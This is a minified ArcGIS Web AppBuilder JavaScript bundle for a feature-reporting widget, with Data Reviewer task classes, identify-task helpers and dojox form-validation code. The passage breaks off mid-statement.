// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.

require({cache:{"widgets/ReportFeature/SelectFeatureDialog":function(){define("dojo/_base/declare dojo/_base/array dojo/_base/lang dojo/on dojo/string dojo/dom-construct dojo/dom-style dijit/_WidgetBase dijit/_TemplatedMixin dojo/query dojo/i18n!esri/nls/jsapi esri/main esri/layers/FeatureLayer esri/toolbars/draw esri/tasks/IdentifyTask esri/tasks/query esri/tasks/IdentifyParameters esri/symbols/SimpleMarkerSymbol esri/symbols/SimpleLineSymbol esri/symbols/SimpleFillSymbol esri/geometry/Extent esri/tasks/datareviewer/ReviewerResultsTask ./InfoWindowContent dojo/text!./SelectFeatureDialog.html".split(" "),
function(k,l,n,m,b,f,g,r,q,e,a,d,c,t,h,u,y,p,z,v,w,x,C,A){var D=new p({type:"esriSMS",style:"esriSMSCircle",size:12,xoffset:0,yoffset:0,color:[0,0,255,51],outline:{type:"esriSLS",style:"esriSLSSolid",color:[0,0,255,128],width:1}}),B=new z({type:"esriSLS",style:"esriSLSSolid",color:[0,0,255,51],width:2}),E=new v({type:"esriSFS",style:"esriSFSSolid",color:[0,0,255,26],outline:{type:"esriSLS",style:"esriSLSSolid",color:[0,0,255,128],width:1}});return k([r,q],{templateString:A,baseClass:"drs-widget-selectFeature",
buildRendering:function(){this.inherited(arguments);this._initDom()},_initDom:function(){var a=this.getLayerOptions();void 0!==a&&""!==a&&f.place(a,this.selectLayer)},postCreate:function(){this.inherited(arguments);this._initEvents()},_initEvents:function(){var d=this;this.selectionToolbar=new t(this.map);this.selectionToolbar.on("draw-end",n.hitch(this,this.addGraphic));this.own(m(this.selectLayer,"change",function(c){a.toolbars.draw.addPoint=d.nls.selectFeatureMapPoint;(c=c.target.value)?d.startSelectFeature(c):
d.cancelSelectFeature()}));this.own(m(this.map.infoWindow,"hide",function(){var a=e(".actionsPane");void 0!==a&&null!==a&&0<a.length&&(a[0].style.display="");d.emit("InfoWindowHide")}))},startSelectFeature:function(a){var d;d=l.filter(this.config.layers,function(d){return d.id===a});if(void 0!==d&&0<d.length&&(d=this.map.getLayer(a),void 0===d)){this.emit("Error",{},[this.nls.errorMapService]);return}this.selectionToolbar.activate(t.POINT);g.set(this.clickAFeatureNode,"display","")},addGraphic:function(a){var b=
this.selectLayer.value,e=l.filter(this.config.layers,function(a){return a.id===b});a=a.geometry;if("ArcGISMapServiceLayer"===e[0].layerType)this.identifyTask=new h(e[0].url),this._identifyFeatures(a);else{null!==this.featureLayer&&void 0!==this.featureLayer&&(this.featureLayer=null);this.featureLayer=new c(e[0].url,{outFields:["*"],mode:d.layers.FeatureLayer.MODE_SELECTION});var e=new u,p=10*(this.map.extent.getWidth()/this.map.width);a=new w(a.x-p,a.y-p,a.x+p,a.y+p,this.map.spatialReference);e.geometry=
a;this.featureLayer.selectFeatures(e,c.SELECTION_NEW,n.hitch(this,function(a){1<a.length?this.emit("Message",{},[this.nls.manyFeaturesSelected]):1===a.length?(this.selectionToolbar.deactivate(),this._onTaskComplete(a[0])):this.emit("Message",{},[this.nls.noFeatureSelected])}))}},cancelSelectFeature:function(){null!==this.selectionToolbar&&void 0!==this.selectionToolbar&&""===this.selectLayer.value&&this.selectionToolbar.deactivate();g.set(this.clickAFeatureNode,"display","none")},_identifyFeatures:function(a){var d=
this,c=new y;this.identifying||(this.identifying=!0,g.set(this.loadingFeaturesNode,"display",""),c.returnGeometry=!0,c.width=this.map.width,c.height=this.map.height,c.tolerance=3,c.geometry=a,c.mapExtent=this.map.extent,c.spatialReference=this.map.spatialReference,this.identifyTask.execute(c).then(function(a){0<a.length?(d.selectionToolbar.deactivate(),d._onTaskComplete(a[0].feature)):(g.set(d.loadingFeaturesNode,"display","none"),d.identifying=!1,this.emit("Message",{},[this.nls.noFeatureSelected]))},
function(a){d._onIdentifyError(a)}))},_onTaskComplete:function(a){var d=this,c,h;this.identifying=!1;g.set(this.loadingFeaturesNode,"display","none");if(a){var b=this.selectLayer.value,e=l.filter(this.config.layers,function(a){return a.id===b});this._selectedFeature=a;switch(a.geometry.type){case "point":a.setSymbol(D);h=a.geometry;c=this.map.centerAt(a.geometry);break;case "polyline":a.setSymbol(B);h=a.geometry.getExtent().getCenter();a.setSymbol(B);c=this.map.centerAt(h);break;case "polygon":a.setSymbol(E),
h=a.geometry.getCentroid(),c=this.map.centerAt(h)}c.then(function(){d._showInfoWindow(e[0].alias,h,a)})}},_showInfoWindow:function(a,d,c){var h=this;this.infoWindowContent=new C({nls:this.nls,title:this.nls.select,includeReportedBy:this.config.includeReportedBy,defaultUserName:this.config.defaultUserName,onReportSubmit:function(a){h.submitReport(a)}},f.create("div"));this.map.infoWindow.setTitle(this.nls.infoWindowTitle);this.infoWindowContent.startup();this.infoWindowContent.set("layerName",a);this.infoWindowContent.set("graphic",
c);m.once(this.map.infoWindow,"hide",function(){h.selectionToolbar.activate(t.POINT);h.map.setInfoWindowOnClick(!1)});this.map.infoWindow.destroyDijits();e(".actionsPane")[0].style.display="none";this.map.infoWindow.setContent(this.infoWindowContent.domNode);this.map.infoWindow.resize(300,600);this.map.infoWindow.show(d);this.emit("SelectFeature")},_onIdentifyError:function(a){this.identifying=!1;g.set(this.loadingFeaturesNode,"display","none");this.emit("Error",{},[this.nls.errorIdentify,a])},submitReport:function(a){var d=
this;a.sessionId=this._sessionId;this.map.infoWindow.hide();this._reviewerResultsTask.writeFeatureAsResult(a,this._selectedFeature).then(function(a,c){d._onWriteFeatureAsResultComplete(a,c)},function(a){d._onWriteFeatureAsResultError(a)})},_onWriteFeatureAsResultComplete:function(a){a&&a.success?(this.emit("Message",{},["",this.nls.reportMessage]),this.selectionToolbar.activate(t.POINT)):this.emit("Error",{}[this.nls.errorReportMessage])},_onWriteFeatureAsResultError:function(a){this.selectionToolbar.activate(t.POINT);
this.emit("Error",{},[a.message,a])},reset:function(){this.selectLayer.selectedIndex=0;this.cancelSelectFeature();void 0!==this.infoWindowContent&&null!==this.infoWindowContent&&this.infoWindowContent.destroyRecursive();this.map.setInfoWindowOnClick(!1)},setDrsUrl:function(a){this._reviewerResultsTask=new x(a)},setReviewerSession:function(a){isNaN(a)?this._sessionId=1:this._sessionId=parseInt(a,10)},getLayerOptions:function(){var a="";l.forEach(this.config.layers,function(d){!0===d.show&&(a+=b.substitute('\x3coption value\x3d"${id}"\x3e${alias}\x3c/option\x3e',
d))});return a}})})},"esri/tasks/IdentifyTask":function(){define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/has ../kernel ../request ../geometry/normalizeUtils ./Task ./IdentifyResult".split(" "),function(k,l,n,m,b,f,g,r,q){k=k(r,{declaredClass:"esri.tasks.IdentifyTask",_eventMap:{complete:["results"]},constructor:function(b,a){this._url.path+="/identify";this._handler=l.hitch(this,this._handler);this.gdbVersion=a&&a.gdbVersion;this.registerConnectEvents()},__msigns:[{n:"execute",c:3,
a:[{i:0,p:["geometry"]}],e:2}],_handler:function(b,a,d,c,f){try{var h=[];n.forEach(b.results,function(a,d){h[d]=new q(a)});this._successHandler([h],"onComplete",d,f)}catch(u){this._errorHandler(u,c,f)}},execute:function(b,a,d,c){var e=c.assembly;b=this._encode(l.mixin({},this._url.query,{f:"json"},b.toJson(e&&e[0])));var h=this._handler,g=this._errorHandler;this.gdbVersion&&(b.gdbVersion=this.gdbVersion);return f({url:this._url.path,content:b,callbackParamName:"callback",load:function(b,p){h(b,p,
a,d,c.dfd)},error:function(a){g(a,d,c.dfd)}})},onComplete:function(){}});g._createWrappers(k);m("extend-esri")&&l.setObject("tasks.IdentifyTask",k,b);return k})},"esri/tasks/IdentifyResult":function(){define("dojo/_base/declare dojo/_base/lang dojo/has ../kernel ../graphic ../geometry/jsonUtils".split(" "),function(k,l,n,m,b,f){k=k(null,{declaredClass:"esri.tasks.IdentifyResult",constructor:function(g){l.mixin(this,g);this.feature=new b(g.geometry?f.fromJson(g.geometry):null,null,g.attributes);delete this.geometry;
delete this.attributes}});n("extend-esri")&&l.setObject("tasks.IdentifyResult",k,m);return k})},"esri/tasks/IdentifyParameters":function(){define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/_base/json dojo/has ../kernel ../layerUtils ../geometry/jsonUtils ../geometry/scaleUtils".split(" "),function(k,l,n,m,b,f,g,r,q){var e=k(null,{declaredClass:"esri.tasks.IdentifyParameters",constructor:function(){this.layerOption=e.LAYER_OPTION_TOP},geometry:null,spatialReference:null,layerIds:null,
tolerance:null,returnGeometry:!1,returnFieldName:!1,returnUnformattedValues:!1,mapExtent:null,width:400,height:400,dpi:96,layerDefinitions:null,timeExtent:null,layerTimeOptions:null,dynamicLayerInfos:null,toJson:function(a){var d=a&&a.geometry||this.geometry,c=this.mapExtent,b=this.spatialReference,h=this.layerIds;a={tolerance:this.tolerance,returnGeometry:this.returnGeometry,returnFieldName:this.returnFieldName,returnUnformattedValues:this.returnUnformattedValues,imageDisplay:this.width+","+this.height+
","+this.dpi,maxAllowableOffset:this.maxAllowableOffset,geometryPrecision:this.geometryPrecision};if(d){var e=d.toJson();delete e.spatialReference;a.geometry=m.toJson(e);a.geometryType=r.getJsonType(d)}b?a.sr=b.wkid||m.toJson(b.toJson()):d&&d.spatialReference?a.sr=d.spatialReference.wkid||m.toJson(d.spatialReference.toJson()):c&&c.spatialReference&&(a.sr=c.spatialReference.wkid||m.toJson(c.spatialReference.toJson()));c&&(a.mapExtent=c.xmin+","+c.ymin+","+c.xmax+","+c.ymax);a.layers=this.layerOption;
h&&(a.layers+=":"+h.join(","));a.layerDefs=g._serializeLayerDefinitions(this.layerDefinitions,!0);d=this.timeExtent;a.time=d?d.toJson().join(","):null;a.layerTimeOptions=g._serializeTimeOptions(this.layerTimeOptions);if(this.dynamicLayerInfos&&0<this.dynamicLayerInfos.length){var c=q.getScale({extent:c,width:this.width,spatialReference:c.spatialReference}),f=g._getLayersForScale(c,this.dynamicLayerInfos),p=[];n.forEach(this.dynamicLayerInfos,function(a){if(!a.subLayerIds){var d=a.id;if((!this.layerIds||
this.layerIds&&-1!==n.indexOf(this.layerIds,d))&&-1!==n.indexOf(f,d)){var c={id:d};c.source=a.source&&a.source.toJson();var h;this.layerDefinitions&&this.layerDefinitions[d]&&(h=this.layerDefinitions[d]);h&&(c.definitionExpression=h);var b;this.layerTimeOptions&&this.layerTimeOptions[d]&&(b=this.layerTimeOptions[d]);b&&(c.layerTimeOptions=b.toJson());p.push(c)}}},this);c=m.toJson(p);"[]"===c&&(c="[{}]");a.dynamicLayers=c}return a}});l.mixin(e,{LAYER_OPTION_TOP:"top",LAYER_OPTION_VISIBLE:"visible",
LAYER_OPTION_ALL:"all"});b("extend-esri")&&l.setObject("tasks.IdentifyParameters",e,f);return e})},"esri/tasks/datareviewer/ReviewerResultsTask":function(){define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/Deferred dojo/json dojo/has ./_DRSBaseTask ../../request ../FeatureSet ../../layers/FeatureEditResult ../../kernel".split(" "),function(k,l,n,m,b,f,g,r,q,e,a){k=k(g,{declaredClass:"esri.tasks.datareviewer.ReviewerResultsTask",constructor:function(a){this.onGetResultsComplete=l.hitch(this,
this.onGetResultsComplete);this.onWriteResultComplete=l.hitch(this,this.onWriteResultComplete);this.onWriteFeatureAsResultComplete=l.hitch(this,this.onWriteFeatureAsResultComplete);this.onGetLayerDefinitionComplete=l.hitch(this,this.onGetLayerDefinitionComplete);this.onGetBatchRunDetailsComplete=l.hitch(this,this.onGetBatchRunDetailsComplete)},getResults:function(a,c){var d=this._successHandler,h=this._errorHandler,b=this._appendQueryParams,e=this._url+"/ReviewerResults/getResults",e=b(e),p=new m;
a={queryParameters:a.toJSON(),f:"json"};null!==c&&void 0!==c&&(a.filtersArray=c.toJSON());r({callbackParamName:"callback",url:e,content:a}).then(l.hitch(this,function(a,c){if(void 0!==a.error)c=Error(),c.message=a.error.message,c.code=a.error.code,h(c,p);else try{if(void 0===a.features||void 0===a.fieldAliases||void 0===a.fields)h(null,p);else{var b=new q(a);d({featureSet:b},"onGetResultsComplete",p)}}catch(x){h(x,p)}}),function(a,d){h(a,p)});return p},writeResult:function(a,c){var d=this._successHandler,
h=this._errorHandler,e=this._appendQueryParams,f=this._url+"/ReviewerResults/writeResult",f=e(f),p=new m;r({callbackParamName:"callback",url:f,content:{reviewerAttributes:a.toJSON(),geometry:b.stringify(c.toJson()),f:"json"}}).then(l.hitch(this,function(a,c){c=Error();if(void 0!==a.error)c.message=a.error.message,c.code=a.error.code,h(c,p);else try{void 0!==a.result&&"error"===a.result?(c.message=a.messages,c.code=a.result,h(c,p)):"success"===a.result?d({success:!0},"onWriteResultComplete",p):h(null,
p)}catch(w){h(w,p)}}),function(a,d){h(a,p)});return p},writeFeatureAsResult:function(a,c){var d=this._successHandler,h=this._errorHandler,e=this._appendQueryParams,f=this._url+"/ReviewerResults/writeFeatureAsResult",f=e(f),p=new m;r({callbackParamName:"callback",url:f,content:{reviewerAttributes:a.toJSON(),feature:b.stringify(c.toJson()),f:"json"}}).then(l.hitch(this,function(a,c){c=Error();if(void 0!==a.error)c.message=a.error.message,c.code=a.error.code,h(c,p);else try{void 0!==a.result&&"error"===
a.result?(c.message=a.messages,c.code=a.result,h(c,p)):"success"===a.result?d({success:!0},"onWriteFeatureAsResultComplete",p):h(null,p)}catch(w){h(w,p)}}),function(a,d){h(a,p)});return p},getLayerDefinition:function(a){var c=this._successHandler,d=this._errorHandler,b=this._appendQueryParams,e=this._url+"/ReviewerResults/getLayerDefinition",e=b(e),f=new m,b={f:"json"};if(null!==a||void 0!==a)b.filtersArray=a.toJSON();r({callbackParamName:"callback",url:e,content:b}).then(l.hitch(this,function(a,
b){if(void 0!==a.error)b=Error(),b.message=a.error.message,b.code=a.error.code,d(b,f);else try{void 0===a.whereClause?d(null,f):c({whereClause:a.whereClause},"onGetLayerDefinitionComplete",f)}catch(v){d(v,f)}}),function(a,c){d(a,f)});return f},getBatchRunDetails:function(a){var d=this._successHandler,e=this._errorHandler,h=this._appendQueryParams,f=this._url+"/ReviewerResults/getBatchRunDetails",f=h(f),g=new m;r({callbackParamName:"callback",url:f,content:{batchRunIds:b.stringify(a),f:"json"}}).then(l.hitch(this,
function(a,c){if(void 0!==a.error)c=Error(),c.message=a.error.message,c.code=a.error.code,e(c,g);else try{if(void 0===a.features||void 0===a.fieldAliases||void 0===a.fields)e(null,g);else{var b=new q(a);d({featureSet:b},"onGetBatchRunDetailsComplete",g)}}catch(w){e(w,g)}}),function(a,d){e(a,g)});return g},updateLifecycleStatus:function(a,c,b,h){var d=this._successHandler,f=this._errorHandler,g=this._appendQueryParams,k=this._url+"/ReviewerResults/updateLifecycleStatus",k=g(k),t=new m;r({callbackParamName:"callback",
url:k,content:{sessionId:a,lifecycleStatus:c,technicianName:b,filtersArray:h.toJSON(),f:"json"}}).then(l.hitch(this,function(a,c){if(void 0!==a.error)c=Error(),c.message=a.error.message,c.code=a.error.code,f(c,t);else try{var b=[];n.forEach(a.updateResults,function(a){var c=new e;c.error=Error(a.description);c.success=a.success;c.objectId=a.objectId;b.push(c)});d({featureEditResults:b},"onUpdateLifecycleStatusComplete",t)}catch(A){f(A,t)}}),function(a,c){f(a,t)});return t},getResultsFieldNames:function(){return"recordId objectId subtype category sessionId checktitle resourceName checkName notes severity reviewStatus correctionStatus verificationStatus reviewTechnician correctionTechnician verificationTechnician reviewDateUtc correctionDateUtc verificationDateUtc lifecycleStatus".split(" ")},
onGetResultsComplete:function(a){},onWriteResultComplete:function(a){},onWriteFeatureAsResultComplete:function(a){},onGetLayerDefinitionComplete:function(a){},onGetBatchRunDetailsComplete:function(a){},onUpdateLifecycleStatusComplete:function(a){}});f("extend-esri")&&l.setObject("tasks.datareviewer.ReviewerResultsTask",k,a);return k})},"esri/tasks/datareviewer/_DRSBaseTask":function(){define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/Deferred dojo/has ../../request ../../urlUtils ../../kernel ../Task ./ReviewerSession".split(" "),
function(k,l,n,m,b,f,g,r,q,e){k=k(q,{declaredClass:"esri.tasks.datareviewer.DRSBaseTask",_url:null,_queryParams:null,_reviewerMapServerUrl:null,constructor:function(a){"/"==a[a.length-1]&&(a=a.slice(0,-1));a=g.urlToObject(a);this._url=a.path;this._queryParams=a.query;a=this._url.toLowerCase().lastIndexOf("/exts/");0<a&&(this._reviewerMapServerUrl=this._url.substring(0,a));this._successHandler=l.hitch(this,this._successHandler);this._errorHandler=l.hitch(this,this._errorHandler);this._appendQueryParams=
l.hitch(this,this._appendQueryParams);this.onError=l.hitch(this,this.onError)},_appendQueryParams:function(a){if(this._queryParams)for(var d in this._queryParams)a=g.urlToObject(a).query?a+("\x26"+d+"\x3d"+this._queryParams[d]):a+("?"+d+"\x3d"+this._queryParams[d]);return a},_successHandler:function(a,d,c){d&&this[d].apply(this,[a]);c&&c.resolve(a)},_errorHandler:function(a,d){null===a&&(a=Error("Unexpected response received from server"),a.code=500);this.onError(a);d&&d.reject(a)},getReviewerMapServerUrl:function(){var a=
null;if(a=this._reviewerMapServerUrl){if(this._queryParams)for(var d in this._queryParams)a=g.urlToObject(a).query?a+("\x26"+d+"\x3d"+this._queryParams[d]):a+("?"+d+"\x3d"+this._queryParams[d]);return a}return null},getLifecycleStatusStrings:function(){var a=this._successHandler,d=this._errorHandler,c=this._appendQueryParams,b=this._url+"/Utilities/getLifecycleStatusStrings",b=c(b),h=new m;f({callbackParamName:"callback",url:b,content:{f:"json"}}).then(l.hitch(this,function(c,b){if(void 0!==c.error)b=
Error(),b.message=c.error.message,b.code=c.error.code,d(b,h);else try{var f=c.lifecycleStatusString;if(void 0===f)d(null,h);else{var e=[];n.forEach(f,function(a,c){e[a.descriptionCode]=a.descriptionString});a({lifecycleStatusStrings:e},"onGetLifecycleStatusStringsComplete",h)}}catch(v){d(v,h)}}),function(a,c){d(a,h)});return h},createReviewerSession:function(a,d){var c=this._successHandler,b=this._errorHandler,h=this._appendQueryParams,g=this._url+"/Utilities/createReviewerSession",g=h(g),k=new m;
f({callbackParamName:"callback",url:g,content:{sessionName:a,sessionProperties:d.toJsonSessionOptions(),f:"json"}}).then(l.hitch(this,function(a,d){if(void 0!==a.error)d=Error(),d.message=a.error.message,d.code=a.error.code,b(d,k);else try{if(void 0===a.sessionAttributes)b(null,k);else{var f=a.sessionAttributes,h=new e(f.sessionId,f.sessionName,f.userName,f.versionName);c({reviewerSession:h},"onCreateReviewerSessionComplete",k)}}catch(x){b(x,k)}}),function(a,c){b(a,k)});return k},getReviewerSessions:function(){var a=
this._successHandler,d=this._errorHandler,c=this._appendQueryParams,b=this._url+"/Utilities/getReviewerSessions",b=c(b),h=new m;f({callbackParamName:"callback",url:b,content:{f:"json"}}).then(l.hitch(this,function(c,b){if(void 0!==c.error)b=Error(),b.message=c.error.message,b.code=c.error.code,d(b,h);else try{var f=c.sessionAttributes;if(void 0===f)d(null,h);else{var g=[];n.forEach(f,function(a,c){g[c]=new e(a.sessionId,a.sessionName,a.userName,a.versionName)});a({reviewerSessions:g},"onGetReviewerSessionsComplete",
h)}}catch(v){d(v,h)}}),function(a,c){d(a,h)});return h},getCustomFieldNames:function(){var a=this._successHandler,d=this._errorHandler,c="BATCHJOBCHECKGROUP CHECKTITLE FEATUREOBJECTCLASS LIFECYCLEPHASE LIFECYCLESTATUS SESSIONID SEVERITY SUBTYPE".split(" "),b=this._appendQueryParams,e=this._url+"/Dashboard",e=b(e),g=new m;f({callbackParamName:"callback",url:e,content:{f:"json"}}).then(l.hitch(this,function(b,f){if(void 0!==b.error)f=Error(),f.message=b.error.message,f.code=b.error.code,d(f,g);else try{var e=
[];void 0===b.reviewerResultsBy&&d(null,g);n.forEach(b.reviewerResultsBy,function(a,d){-1===c.indexOf(a.name)&&e.push(a.name)});a({customFieldNames:e},"onGetCustomFieldNamesComplete",g)}catch(v){d(v,g)}}),function(a,c){d(a,g)});return g},onGetLifecycleStatusStringsComplete:function(a){},onGetReviewerSessionsComplete:function(a){},onCreateReviewerSessionComplete:function(a){},onGetCustomFieldNamesComplete:function(a){},onError:function(a){}});b("extend-esri")&&l.setObject("tasks.datareviewer.DRSBaseTask",
k,r);return k})},"esri/tasks/datareviewer/ReviewerSession":function(){define(["dojo/_base/declare","dojo/has","dojo/_base/lang","../../kernel"],function(k,l,n,m){k=k(null,{declaredClass:"esri.tasks.datareviewer.ReviewerSession",sessionId:NaN,sessionName:"",userName:"",versionName:"",constructor:function(b,f,g,l){this.sessionId=b;this.sessionName=f;this.userName=g;void 0!==l&&(this.versionName=l)},toString:function(){return isNaN(this.sessionId)?null:"Session "+this.sessionId+" : "+this.sessionName}});
l("extend-esri")&&n.setObject("tasks.datareviewer.ReviewerSession",k,m);return k})},"widgets/ReportFeature/InfoWindowContent":function(){define("dojo/_base/declare dojo/_base/array dojo/on dojo/dom-construct dojo/dom-class dojo/query dijit/_WidgetBase dijit/_TemplatedMixin esri/tasks/datareviewer/ReviewerAttributes dojo/text!./InfoWindowContent.html dojox/validate jimu/tokenUtils dojox/validate/check dojo/NodeList-dom".split(" "),function(k,l,n,m,b,f,g,r,q,e,a,d){return k([g,r],{baseClass:"drs-feature-info-window",
templateString:e,infoTitle:null,_setGraphicAttr:function(a){this.setGraphic(a)},_setLayerNameAttr:function(a){this.setLayerName(a)},_setNlsAttr:function(a){this.setLocalizedStrings(a)},postCreate:function(){this.inherited(arguments);this._initEvents()},_initEvents:function(){var a=this;"logon"===this.includeReportedBy||"default"===this.includeReportedBy?this.showHideDynamicRows(!1):this.showHideDynamicRows(!0);this.own(n(this.formNode,"submit",function(c){c.preventDefault();a._onFormSubmit()}))},
showHideDynamicRows:function(a){var c=f(".dynamicRow",this.formNode);if(void 0!==c&&null!==c&&0<c.length)for(var d=0;d<c.length;d++)c[d].style.display=a?"":"none"},setLayerName:function(a){this.formNode.reset();this.layerName=a;this.reviewerAttributes||(this.reviewerAttributes=new q);this.reviewerAttributes.resourceName=a;this.reviewerAttributes.severity=5;this.reviewerAttributes.lifecycleStatus=1;this.layerNode.innerHTML=this.layerName;this.statusNode.focus()},setGraphic:function(a){this.graphic=
a},setLocalizedStrings:function(a){var c=this.params.title;this.statusNode.options.length=0;var d="";this.nls=a;if(c===this.nls.select)for(var b in a)-1<b.indexOf("selectReviewStatus")&&(d=d+"\x3coption\x3e"+a[b]+"\x3c/option\x3e");else for(var f in a)-1<f.indexOf("drawReviewStatus")&&(d=d+"\x3coption\x3e"+a[f]+"\x3c/option\x3e");d&&m.place(d,this.statusNode,"last")},_onFormSubmit:function(){if(this.isFormValid()){if("default"===this.includeReportedBy)this.reviewerAttributes.reviewTechnician=this.defaultUserName;
else if("logon"===this.includeReportedBy){var a=d.getPortalCredential(d.getPortalUrl());this.reviewerAttributes.reviewTechnician=a.userId}else 0<this.reportedByNode.value.length&&(this.reviewerAttributes.reviewTechnician=this.reportedByNode.value);this.reviewerAttributes.notes=this.notesNode.value;this.reviewerAttributes.reviewStatus=this.statusNode.value;this.reviewerAttributes.severity=this.severityNode.value;this.emit("ReportSubmit",{},[this.reviewerAttributes])}},isFormValid:function(){var c=
{trim:["notes","reviewTechnician"],required:["reviewStatus"]},d;"user"===this.includeReportedBy&&c.required.push("reviewTechnician");c=a.check(this.formNode,c);d=c.hasMissing();f("input, select",this.formNode).removeClass("drs-input-err");d&&l.forEach(c.getMissing(),function(a){b.add(this.formNode[a],"drs-input-err")},this);return!d}})})},"esri/tasks/datareviewer/ReviewerAttributes":function(){define(["dojo/_base/declare","dojo/json","dojo/has","dojo/_base/lang","../../kernel"],function(k,l,n,m,b){k=
k(null,{declaredClass:"esri.tasks.datareviewer.ReviewerAttributes",sessionId:NaN,severity:NaN,resourceName:null,reviewStatus:null,reviewTechnician:null,notes:null,subtype:"",lifecycleStatus:NaN,constructor:function(){},toJSON:function(){var b={};isNaN(this.sessionId)||(b.sessionId=this.sessionId);isNaN(this.severity)||(b.severity=this.severity);null!==this.resourceName&&(b.resourceName=this.resourceName);null!==this.reviewStatus&&(b.reviewStatus=this.reviewStatus);null!==this.reviewTechnician&&(b.reviewTechnician=
this.reviewTechnician);null!==this.notes&&(b.notes=this.notes);null!==this.subtype&&(b.subtype=this.subtype);isNaN(this.lifecycleStatus)||(b.lifecycleStatus=this.lifecycleStatus);return l.stringify(b)}});n("extend-esri")&&m.setObject("tasks.datareviewer.ReviewerAttributes",k,b);return k})},"dojox/validate":function(){define(["./validate/_base"],function(k){return k})},"dojox/validate/_base":function(){define(["dojo/_base/lang","dojo/regexp","dojo/number","./regexp"],function(k,l,n,m){var b=k.getObject("dojox.validate",
!0);b.isText=function(b,g){g="object"==typeof g?g:{};return/^\s*$/.test(b)||"number"==typeof g.length&&g.length!=b.length||"number"==typeof g.minlength&&g.minlength>b.length||"number"==typeof g.maxlength&&g.maxlength<b.length?!1:!0};b._isInRangeCache={};b.isInRange=function(f,g){f=n.parse(f,g);if(isNaN(f))return!1;g="object"==typeof g?g:{};var l="number"==typeof g.max?g.max:Infinity,k="number"==typeof g.min?g.min:-Infinity,e=b._isInRangeCache;g=f+"max"+l+"min"+k+"dec"+("string"==typeof g.decimal?
g.decimal:".");if("undefined"!=typeof e[g])return e[g];e[g]=!(f<k||f>l);return e[g]};b.isNumberFormat=function(b,g){return(new RegExp("^"+m.numberFormat(g)+"$","i")).test(b)};b.isValidLuhn=function(b){var g=0,f,l;k.isString(b)||(b=String(b));b=b.replace(/[- ]/g,"");f=b.length%2;for(var e=0;e<b.length;e++)l=parseInt(b.charAt(e)),e%2==f&&(l*=2),9<l&&(l-=9),g+=l;return!(g%10)};return b})},"dojox/validate/check":function(){define(["dojo/_base/kernel","dojo/_base/lang","./_base"],function(k,l,n){k.experimental("dojox.validate.check");
n.check=function(k,b){var f=[],g=[],m={isSuccessful:function(){return!this.hasInvalid()&&!this.hasMissing()},hasMissing:function(){return 0<f.length},getMissing:function(){return f},isMissing:function(a){for(var b=0;b<f.length;b++)if(a==f[b])return!0;return!1},hasInvalid:function(){return 0<g.length},getInvalid:function(){return g},isInvalid:function(a){for(var b=0;b<g.length;b++)if(a==g[b])return!0;return!1}},q=function(a,b){return"undefined"==typeof b[a]};if(b.trim instanceof Array)for(var e=0;e<
b.trim.length;e++){var a=k[b.trim[e]];q("type",a)||"text"!=a.type&&"textarea"!=a.type&&"password"!=a.type||(a.value=a.value.replace(/(^\s*|\s*$)/g,""))}if(b.uppercase instanceof Array)for(e=0;e<b.uppercase.length;e++)a=k[b.uppercase[e]],q("type",a)||"text"!=a.type&&"textarea"!=a.type&&"password"!=a.type||(a.value=a.value.toUpperCase());if(b.lowercase instanceof Array)for(e=0;e<b.lowercase.length;e++)a=k[b.lowercase[e]],q("type",a)||"text"!=a.type&&"textarea"!=a.type&&"password"!=a.type||(a.value=
a.value.toLowerCase());if(b.ucfirst instanceof Array)for(e=0;e<b.ucfirst.length;e++)a=k[b.ucfirst[e]],q("type",a)||"text"!=a.type&&"textarea"!=a.type&&"password"!=a.type||(a.value=a.value.replace(/\b\w+\b/g,function(a){return a.substring(0,1).toUpperCase()+a.substring(1).toLowerCase()}));if(b.digit instanceof Array)for(e=0;e<b.digit.length;e++)a=k[b.digit[e]],q("type",a)||"text"!=a.type&&"textarea"!=a.type&&"password"!=a.type||(a.value=a.value.replace(/\D/g,""));if(b.required instanceof Array)for(e=
0;e<b.required.length;e++)if(l.isString(b.required[e]))if(a=k[b.required[e]],!q("type",a)&&("text"==a.type||"textarea"==a.type||"password"==a.type||"file"==a.type)&&/^\s*$/.test(a.value))f[f.length]=a.name;else if(!(q("type",a)||"select-one"!=a.type&&"select-multiple"!=a.type||-1!=a.selectedIndex&&!/^\s*$/.test(a.options[a.selectedIndex].value)))f[f.length]=a.name;else if(a instanceof Array){for(var d=!1,c=0;c<a.length;c++)a[c].checked&&(d=!0);d||(f[f.length]=a[0].name)}if(b.required instanceof Array)for(e=
0;e<b.required.length;e++)if(l.isObject(b.required[e])){var t,h;for(h in b.required[e])a=k[h],t=b.required[e][h];if(a instanceof Array){for(c=d=0;c<a.length;c++)a[c].checked&&d++;d<t&&(f[f.length]=a[0].name)}else if(!q("type",a)&&"select-multiple"==a.type){for(c=d=0;c<a.options.length;c++)a.options[c].selected&&!/^\s*$/.test(a.options[c].value)&&d++;d<t&&(f[f.length]=a.name)}}if(l.isObject(b.dependencies))for(h in b.dependencies)a=k[h],q("type",a)||"text"!=a.type&&"textarea"!=a.type&&"password"!=
a.type||/\S+/.test(a.value)||m.isMissing(a.name)||(e=k[b.dependencies[h]],"text"!=e.type&&"textarea"!=e.type&&"password"!=e.type||/^\s*$/.test(e.value)||(f[f.length]=a.name));if(l.isObject(b.constraints))for(h in b.constraints)if((a=k[h])&&(q("tagName",a)||!(0<=a.tagName.toLowerCase().indexOf("input")||0<=a.tagName.toLowerCase().indexOf("textarea"))||!/^\s*$/.test(a.value))){var u;if(l.isFunction(b.constraints[h]))u=b.constraints[h](a.value);else if(l.isFunction(l.getObject(h,!1,b.constraints)))u=
l.getObject(h,!1,b.constraints)(a.value);else if(l.isArray(b.constraints[h]))if(l.isArray(b.constraints[h][0]))for(e=0;e<b.constraints[h].length&&(u=n.evaluateConstraint(b,b.constraints[h][e],h,a),u.isValid);e++);else u=l.isFunction(l.getObject(h,!1,b.constraints))?n.evaluateConstraint(b,b.constraints[b.constraints[h]],h,a):n.evaluateConstraint(b,b.constraints[h],h,a);u?"boolean"===typeof u||u.isValid||(g[g.length]={field:a.name,message:u.message}):g[g.length]=a.name}if(l.isObject(b.confirm))for(h in b.confirm)a=
